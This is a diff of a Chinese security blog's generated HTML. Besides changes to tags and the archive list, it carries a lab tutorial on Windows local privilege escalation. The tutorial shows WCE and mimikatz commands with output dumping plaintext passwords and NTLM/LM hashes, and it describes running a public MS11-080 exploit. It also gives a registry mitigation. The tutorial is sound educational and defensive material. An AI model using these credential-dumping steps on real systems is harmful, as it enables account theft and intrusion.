@@ -263,6 +263,8 @@ height:50vh;
     
         <a class="post-tag" href="javascript:void(0);" data-tags = "渗透测试">渗透测试</a>
     
+        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞分析">漏洞分析</a>
+    
 </div>
                 
                 
@@ -417,7 +419,6 @@ height:50vh;
 <h4 id="直接获取账号密码"><a href="#直接获取账号密码" class="headerlink" title="直接获取账号密码"></a>直接获取账号密码</h4><p>　　这里列出两种手段，嗅探和使用WCE(Windows Credential Editor)。主要目的都是获取密码。<br>　　下面主要讲解WCE的用法和原理，嗅探这里省略<code>(ps:安利一个抓包工具Omnipeek，辣是真的好用，比wireshark多了好多功能特性)</code><br>　　kali中自带wce工具，具体位置为:<code>/usr/share/windows-resources/wce</code>里面有32位和64位，以及一个自动判断位数的版本，拷出来到winXP中使用。<br>　　这个工具的主要原理是从内存中的安全包(security package)中获取明文密码信息，不同于mimikatz这种从SAM文件中获取的方式，后者只能获取到密文，但是WCE是可以获取到明文密码的。<br>　　<strong>使用条件：获取到管理员权限</strong><br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Documents</span> <span class="title">and</span> <span class="title">Settings</span>\<span class="title">float</span>\桌面&gt;<span class="title">wce</span>-<span class="title">universal.exe</span> -<span class="title">h</span></span></span><br><span class="line"><span class="function"><span class="title">WCE</span> <span class="title">v1</span>.41<span class="title">beta</span> (<span class="title">Windows</span> <span class="title">Credentials</span> <span class="title">Editor</span>) - (<span class="title">c</span>) 2010-2013 <span class="title">Amplia</span> <span class="title">Security</span> - <span class="title">by</span> <span class="title">Hernan</span> <span class="title">Ochoa</span> (<span class="title">hernan</span></span></span><br><span class="line"><span class="function">@<span class="title">ampliasecurity.com</span>)</span></span><br><span class="line"><span class="function"><span class="title">Use</span> -<span class="title">h</span> <span class="title">for</span> <span class="title">help</span>.</span></span><br><span class="line"><span class="function"><span class="title">Options</span>:</span></span><br><span class="line"><span class="function">        -<span class="title">l</span>              <span class="title">List</span> <span class="title">logon</span> <span class="title">sessions</span> <span class="title">and</span> <span class="title">NTLM</span> <span class="title">credentials</span> (<span class="title">default</span>).</span></span><br><span class="line"><span class="function">        -<span class="title">s</span>              <span class="title">Changes</span> <span class="title">NTLM</span> <span class="title">credentials</span> <span class="title">of</span> <span class="title">current</span> <span class="title">logon</span> <span class="title">session</span>.</span></span><br><span class="line"><span class="function">                        <span class="title">Parameters</span>: &lt;<span class="title">UserName</span>&gt;:&lt;<span class="title">DomainName</span>&gt;:&lt;<span class="title">LMHash</span>&gt;:&lt;<span class="title">NTHash</span>&gt;.</span></span><br><span class="line"><span class="function">        -<span class="title">r</span>              <span class="title">Lists</span> <span class="title">logon</span> <span class="title">sessions</span> <span class="title">and</span> <span class="title">NTLM</span> <span class="title">credentials</span> <span class="title">indefinitely</span>.</span></span><br><span class="line"><span class="function">                        <span class="title">Refreshes</span> <span class="title">every</span> 5 <span class="title">seconds</span> <span class="title">if</span> <span class="title">new</span> <span class="title">sessions</span> <span class="title">are</span> <span class="title">found</span>.</span></span><br><span class="line"><span class="function">                        <span class="title">Optional</span>: -<span class="title">r</span>&lt;<span class="title">refresh</span> <span class="title">interval</span>&gt;.</span></span><br><span class="line"><span class="function">        -<span class="title">c</span>              <span class="title">Run</span> &lt;<span class="title">cmd</span>&gt; <span class="title">in</span> <span class="title">a</span> <span class="title">new</span> <span class="title">session</span> <span class="title">with</span> <span class="title">the</span> <span class="title">specified</span> <span class="title">NTLM</span> <span class="title">credentials</span>.</span></span><br><span class="line"><span class="function">                        <span class="title">Parameters</span>: &lt;<span class="title">cmd</span>&gt;.</span></span><br><span class="line"><span class="function">        -<span class="title">e</span>              <span class="title">Lists</span> <span class="title">logon</span> <span class="title">sessions</span> <span class="title">NTLM</span> <span class="title">credentials</span> <span class="title">indefinitely</span>.</span></span><br><span class="line"><span class="function">                        <span class="title">Refreshes</span> <span class="title">every</span> <span class="title">time</span> <span class="title">a</span> <span class="title">logon</span> <span class="title">event</span> <span class="title">occurs</span>.</span></span><br><span class="line"><span class="function">        -<span class="title">o</span>              <span class="title">saves</span> <span class="title">all</span> <span class="title">output</span> <span class="title">to</span> <span class="title">a</span> <span class="title">file</span>.</span></span><br><span class="line"><span class="function">                        <span class="title">Parameters</span>: &lt;<span class="title">filename</span>&gt;.</span></span><br><span class="line"><span class="function">        -<span class="title">i</span>              <span class="title">Specify</span> <span class="title">LUID</span> <span class="title">instead</span> <span class="title">of</span> <span class="title">use</span> <span class="title">current</span> <span class="title">logon</span> <span class="title">session</span>.</span></span><br><span class="line"><span class="function">                        <span class="title">Parameters</span>: &lt;<span class="title">luid</span>&gt;.</span></span><br><span class="line"><span class="function">        -<span class="title">d</span>              <span class="title">Delete</span> <span class="title">NTLM</span> <span class="title">credentials</span> <span class="title">from</span> <span class="title">logon</span> <span class="title">session</span>.</span></span><br><span class="line"><span class="function">                        <span class="title">Parameters</span>: &lt;<span class="title">luid</span>&gt;.</span></span><br><span class="line"><span class="function">        -<span class="title">a</span>              <span class="title">Use</span> <span class="title">Addresses</span>.</span></span><br><span class="line"><span class="function">                        <span class="title">Parameters</span>: &lt;<span class="title">addresses</span>&gt;</span></span><br><span class="line"><span class="function">        -<span class="title">f</span>              <span class="title">Force</span> '<span class="title">safe</span> <span class="title">mode</span>'.</span></span><br><span class="line"><span class="function">        -<span class="title">g</span>              <span class="title">Generate</span> <span class="title">LM</span> &amp; <span class="title">NT</span> <span class="title">Hash</span>.</span></span><br><span class="line"><span class="function">                        <span class="title">Parameters</span>: &lt;<span class="title">password</span>&gt;.</span></span><br><span class="line"><span class="function">        -<span class="title">K</span>              <span class="title">Dump</span> <span class="title">Kerberos</span> <span class="title">tickets</span> <span class="title">to</span> <span class="title">file</span> (<span class="title">unix</span> &amp; '<span class="title">windows</span> <span class="title">wce</span>' <span class="title">format</span>)</span></span><br><span class="line"><span class="function">        -<span class="title">k</span>              <span class="title">Read</span> <span class="title">Kerberos</span> <span class="title">tickets</span> <span class="title">from</span> <span class="title">file</span> <span class="title">and</span> <span class="title">insert</span> <span class="title">into</span> <span class="title">Windows</span> <span class="title">cache</span></span></span><br><span class="line"><span class="function">        -<span class="title">w</span>              <span class="title">Dump</span> <span class="title">cleartext</span> <span class="title">passwords</span> <span class="title">stored</span> <span class="title">by</span> <span class="title">the</span> <span class="title">digest</span> <span class="title">authentication</span> <span class="title">package</span></span></span><br><span class="line"><span class="function">        -<span class="title">v</span>              <span class="title">verbose</span> <span class="title">output</span>.</span></span><br></pre></td></tr></table></figure></p>
 <p>　　　最常用的参数就是-w了，可以直接获取明文密码，其他常用参数如-l 用来列举当前机器中的所有用户密码哈希值，-s用于更改用户的密码(容易被用户发觉)，他的工作方式有两种：非安全模式和安全模式，这个程序主要是通过注入代码的形式来查找密码，非安全模式即注入的代码可能会注入到了操作系统在内存中的部分，导致操作系统崩溃等现象。下面是-w的结果：<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Documents</span> <span class="title">and</span> <span class="title">Settings</span>\<span class="title">float</span>\桌面&gt;<span class="title">wce</span>-<span class="title">universal.exe</span> -<span class="title">w</span></span></span><br><span class="line"><span class="function"><span class="title">WCE</span> <span class="title">v1</span>.41<span class="title">beta</span> (<span class="title">Windows</span> <span class="title">Credentials</span> <span class="title">Editor</span>) - (<span class="title">c</span>) 2010-2013 <span class="title">Amplia</span> <span class="title">Security</span> - <span class="title">by</span> <span class="title">Hernan</span> <span class="title">Ochoa</span> (<span class="title">hernan</span></span></span><br><span class="line"><span class="function">@<span class="title">ampliasecurity.com</span>)</span></span><br><span class="line"><span class="function"><span class="title">Use</span> -<span class="title">h</span> <span class="title">for</span> <span class="title">help</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">float</span>\<span class="title">XP1</span>:*********(明文密码)</span></span><br><span class="line"><span class="function"><span class="title">NETWORK</span> <span class="title">SERVICE</span>\<span class="title">LAB</span>:9<span class="title">J9y2S</span>]<span class="title">IBx</span>&lt;<span class="title">aqM</span>&lt;<span class="title">n</span>"<span class="title">Mz.AZz</span>-<span class="title">qW</span>&gt;<span class="title">u</span>)0<span class="title">VxAAXJ9bcQHOAg</span>$)<span class="title">f2</span>? 8#<span class="title">g_</span>&lt;$6<span class="title">guK6P</span>/<span class="title">UG</span>-<span class="title">sK</span>@<span class="title">f</span>&amp;<span class="title">b_r6</span>*<span class="title">Orw4</span></span></span><br><span class="line"><span class="function">.<span class="title">JB</span>,<span class="title">H5</span>(<span class="title">c</span>)9<span class="title">SJk</span>%<span class="title">I</span>=<span class="title">Hp6KfKM9</span>)^<span class="title">ev</span> <span class="title">Jn</span>"//<span class="title">cM</span>"<span class="title">B</span>"&amp;</span></span><br><span class="line"><span class="function"><span class="title">XP1</span>$\<span class="title">LAB</span>:9<span class="title">J9y2S</span>]<span class="title">IBx</span>&lt;<span class="title">aqM</span>&lt;<span class="title">n</span>"<span class="title">Mz.AZz</span>-<span class="title">qW</span>&gt;<span class="title">u</span>)0<span class="title">VxAAXJ9bcQHOAg</span>$)<span class="title">f2</span>? 8#<span class="title">g_</span>&lt;$6<span class="title">guK6P</span>/<span class="title">UG</span>-<span class="title">sK</span>@<span class="title">f</span>&amp;<span class="title">b_r6</span>*<span class="title">Orw4.JB</span>,<span class="title">H5</span>(<span class="title">c</span>)9<span class="title">S</span></span></span><br><span class="line"><span class="function"><span class="title">Jk</span>%<span class="title">I</span>=<span class="title">Hp6KfKM9</span>)^<span class="title">ev</span> <span class="title">Jn</span>"//<span class="title">cM</span>"<span class="title">B</span>"&amp;</span></span><br></pre></td></tr></table></figure></p>
 <p>　　WCE防护方法：修改注册表中<code>LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Package</code>的键值即可<br>　　<br>　　同样适用mimikatz也可以抓取到密码(因为配置了域所以有kerberos的密码)：<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::logonPasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">515653</span> (<span class="number">00000000</span>:<span class="number">0007</span>de45)</span><br><span class="line">Session           : Interactive from <span class="number">0</span></span><br><span class="line">User Name         : float</span><br><span class="line">Domain            : XP1</span><br><span class="line">Logon Server      : XP1</span><br><span class="line">Logon <span class="built_in">Time</span>        : <span class="number">2020</span>-<span class="number">1</span>-<span class="number">8</span> <span class="number">14</span>:<span class="number">10</span>:<span class="number">39</span></span><br><span class="line">SID               : S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">796845957</span>-<span class="number">1425521274</span>-<span class="number">682003330</span>-<span class="number">1003</span></span><br><span class="line">        msv :</span><br><span class="line">         [<span class="number">00000002</span>] Primary</span><br><span class="line">         * Username : float</span><br><span class="line">         * Domain   : XP1</span><br><span class="line">         * LM       : <span class="number">2</span>df24fa3b01532639fc401e80d6c3cbb</span><br><span class="line">         * NTLM     : fb5ee6d602ea936c8ff6a202c0079396</span><br><span class="line">         * SHA1     : da7d338ee863c12efc1b6f80e298c577b39eb2a9</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : float</span><br><span class="line">         * Domain   : XP1</span><br><span class="line">         * Password : ******(明文密码)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : float</span><br><span class="line">         * Domain   : XP1</span><br><span class="line">         * Password : ******(明文密码)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        </span><br><span class="line">    ......</span><br></pre></td></tr></table></figure></p>
-<p>　　</p>
 <h3 id="利用漏洞提权"><a href="#利用漏洞提权" class="headerlink" title="利用漏洞提权"></a>利用漏洞提权</h3><p>　　很多漏洞在exploitdb，rapid7等这些公开的漏洞库中都有利用的代码，如果发现有该漏洞的话就可以直接利用了，这里展示两个漏洞的使用，一个是MS11-080(辅助功能驱动程序中的漏洞可能允许特权提升)，另一个是域环境下的MS14-068。<strong>这两个也属于本地提权的范畴</strong></p>
 <h4 id="MS11-080"><a href="#MS11-080" class="headerlink" title="MS11-080"></a>MS11-080</h4><p>　　可以在<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2011/ms11-080" target="_blank" rel="noopener">这里</a>看微软的说明文档以及补丁下载，这个网站下还有其他的漏洞说明可以供你查看。<br>　　在kali中使用searchsploit查找有没有漏洞的利用代码(ps:不是叫searchexploit嘛，换名了??)<br>　　<img src="/img/本地提权与漏洞提权/ms11-080.png" alt=""><br>　　<br>　　将py文件拷贝出来放到xp机器里运行就可以了：<br>　　<img src="/img/本地提权与漏洞提权/ms11-080提取成功.png" alt=""><br>　　<br>　　可以看到我的身份变为了SYSTEM级别(红色背景是脚本设置的)
 　　</p>
@@ -1523,9 +1524,77 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 63
+        Total : 67
         </div>
         <!-- search  -->
         
@@ -1538,6 +1607,26 @@ top:50vh;
     
     <div class="archive-year"> 2020 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/ElasticSearch学习(一)/" >ElasticSearch学习(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/DC-1靶机渗透/" >DC-1靶机渗透</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/03</span><a class="archive-post-title" href= "/Spring-tx反序列化漏洞/" >Spring-tx反序列化漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/fastjson反序列化漏洞学习/" >fastjson反序列化漏洞学习</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1879,7 +1968,7 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
-        <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
+        <span class="sidebar-tag-name" data-tags="Java - 漏洞分析"><span class="iconfont-archer">&#xe606;</span>Java - 漏洞分析</span>
     
         <span class="sidebar-tag-name" data-tags="Javascript"><span class="iconfont-archer">&#xe606;</span>Javascript</span>
     
@@ -1899,6 +1988,10 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="DOM"><span class="iconfont-archer">&#xe606;</span>DOM</span>
     
+        <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
         <span class="sidebar-tag-name" data-tags="JavaEE"><span class="iconfont-archer">&#xe606;</span>JavaEE</span>
     
         <span class="sidebar-tag-name" data-tags="Spring"><span class="iconfont-archer">&#xe606;</span>Spring</span>
@@ -1910,8 +2003,6 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="信息收集"><span class="iconfont-archer">&#xe606;</span>信息收集</span>
     
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
-    
-        <span class="sidebar-tag-name" data-tags="漏洞挖掘"><span class="iconfont-archer">&#xe606;</span>漏洞挖掘</span>
     
         <span class="sidebar-tag-name" data-tags="电子取证"><span class="iconfont-archer">&#xe606;</span>电子取证</span>
     
